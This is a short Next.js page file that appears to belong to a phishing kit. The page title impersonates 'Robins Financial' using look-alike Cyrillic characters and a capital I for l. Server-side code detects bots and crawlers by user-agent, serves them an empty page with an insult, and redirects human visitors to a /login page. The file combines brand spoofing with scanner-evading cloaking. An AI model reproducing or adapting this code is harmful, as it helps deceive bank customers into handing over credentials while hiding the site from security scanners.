import MobileDetect from "mobile-detect";
import device from "device";
import type { NextPage } from "next";
import Head from "next/head";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <title>Rоbins FinаnсiаI</title>
        <link href="/favicon.ico" />
      </Head>
      <div />
    </>
  );
};

export const getServerSideProps = ({ res, req }: { res: any; req: any }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const mydevice = device(req?.headers[`user-agent`] as string);

  const isBot = md.is(`Bot`) || mydevice.is("bot");

  if (isBot) {
    res.end(`Fuck off`);
    return {
      props: { isBot },
    };
  }

  return {
    props: { isBot },
    redirect: {
      destination: "/login",
      permanent: false,
    },
  };
};

export default index;
